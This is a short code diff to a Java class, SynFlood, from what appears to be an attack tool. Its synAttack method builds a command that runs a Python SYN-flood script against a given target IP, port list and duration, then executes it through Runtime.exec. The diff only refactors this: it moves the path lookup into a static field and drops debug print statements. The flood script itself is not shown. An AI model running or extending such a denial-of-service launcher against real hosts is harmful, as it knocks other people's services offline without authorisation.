@@ -10,6 +10,8 @@ import java.util.ArrayList;
  */
 public class SynFlood {
 
+    public static String uri = getURI();
+
     // Perform SYN attack.
     public static void synAttack(String ip) {
 
@@ -22,11 +24,8 @@ public class SynFlood {
 
         String destinationIp = ip;
 
-        String uri = getURI();
         String cmd =  "python " + uri + "/syn.py"
                 + " -t " + destinationIp + " -d " + attackDuration + " " + attackPorts ;
-
-        System.out.println(cmd); // for testing purpose
 
         try {
             Runtime r = Runtime.getRuntime();
@@ -59,8 +58,8 @@ public class SynFlood {
     }
 
     public static String getURI() {
+
         String uri = System.getProperty("user.dir");
-        System.out.println(uri);
 
         return uri;
     }
